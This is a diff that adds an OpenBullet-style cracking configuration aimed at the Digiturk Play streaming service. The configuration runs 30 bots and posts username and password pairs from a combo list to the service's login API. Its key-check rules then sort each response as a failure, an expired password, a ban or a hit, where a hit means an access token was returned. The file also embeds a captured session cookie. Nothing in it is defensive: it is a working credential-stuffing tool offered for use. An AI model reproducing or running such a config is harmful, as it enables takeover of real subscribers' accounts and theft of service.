@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "Digiturk Play Smart TV API",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-17T14:54:28.9579333+03:00",
+  "AdditionalInfo": "eam Tarafından @ConfigZZers Özel Kodlanmıştır",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Proxyless - 30 Bots",
+      "VariableName": "",
+      "Id": 1395747936
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#@ConfigZZers REQUEST POST "https://service2-cloud.digiturkplay.com/api/v2/Users/Account/Login?rnd=0.9459357493605074" 
+  CONTENT "{\"Username\":\"<USER>\",\"Password\":\"<PASS>\",\"grant_type\":\"password\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 87" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Cookie: init=5AAYcLXf6c6XzwHtnl7WM3ds/n+KSsT0vrMhb6iNG/wU9jZTk5F/qs93k9sO6wfS/Zaj4kJVKoV7rWXbPH1u9IwW3/46FmiL30udpBDZDeBtSb92Hyxgyd3EtchGfsjRnb1BrS1zceym6T67zqOWUSqB6AK6WEe6+g+wyEUSSS4rX/KzXsGy9gDAnBdjCVd1iy6PmoY/TRxtzkpXx+HQHTs8rVLcCeU/heQdMC6FIUgrSswEmCO/Mdz2Vunb0ff//nvUYw5VE7QYJPJIi8292CWesCT/ACYCew3rqQTY1T6ztplk2sDv7AxYwavnIIGvxt7OVuKtBQrgHF6qle4Kc4xl9cagnWntJEmFK//SsTTuBS1fowEE/iTNZ0Tddwrl/+0A8KgqoiER9jBi+EDWk3a2mlhY1qmdK2+WYT80LRsVbrfvFZwcx97SfbVMt0+H27XpoYxQlcjIBZfXIDSbI5W+ZNVj/6OqoFIfa2AnWMs4bxIbIJKymPRdPa9+Kq2PRG8MHEHgoGHmMp56ZVyhfCnFkuUrlohPPPjQgeNDsptlAV9KpWTOBIWR263MKqHRhr1+ZphUGfiyZUiW5J7gp3ccCwNbdaqCL84yzWOIAHg=" 
+  HEADER "Host: service2-cloud.digiturkplay.com" 
+  HEADER "Origin: https://smrtlg.digiturkplay.com" 
+  HEADER "Referer: https://smrtlg.digiturkplay.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.75" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+
+#@ConfigZZers KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"Üyelik ya da Şifre bilgisi geçersiz! Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz.\"" 
+    KEY "Email adresiniz geçersiz." 
+    KEY "Bağlantı yaptığınız uygulama için uygun üyeliğiniz bulunamamıştır" 
+    KEY "Giriş yetkiniz bulunmamaktadır." 
+    KEY "{\"status\":200,\"error\":{\"" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Şifrenizin geçerlilik süresi dolmuştur. Lütfen yeni şifre belirleyiniz" 
+    KEY "Sisteme giriş yapabilmek için \\\"Şifremi Unuttum\\\" linkine tıklayarak onay kodu isteyiniz. Gönderilen onay kodu ile şifrenizi belirleyebilirsiniz." 
+    KEY "Sisteme giriş yapabilmek için \\\"şifremi unuttum\\\" ekranından tekrar aktivasyon kodu isteyiniz. Daha sonra size gönderilen aktivasyon kodu ile şifrenizi belirleyiniz" 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Ban OR 
+    KEY "Beklenmeyen Bir Hata Oluştu" 
+
